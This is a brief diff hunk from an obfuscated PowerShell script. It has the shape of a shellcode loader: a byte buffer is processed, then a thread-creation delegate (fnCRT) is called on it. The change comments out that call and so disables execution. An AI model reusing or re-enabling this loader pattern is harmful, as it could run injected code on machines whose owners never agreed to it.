@@ -72,7 +72,7 @@ for ($i=0;$i -le ($awpqwdlg.Length-1);$i++) {
 }
 
 $p = 0
-$o = $oWubAxoZ.fnCRT.Invoke(-1, 0, 0, $gCCHzAVl, 0, 0, 0, [ref]$p)
+#$o = $oWubAxoZ.fnCRT.Invoke(-1, 0, 0, $gCCHzAVl, 0, 0, 0, [ref]$p)
 
 $f = Get-Random -Maximum 10
 while([UInt32]$f -ne ([UInt32]6)){
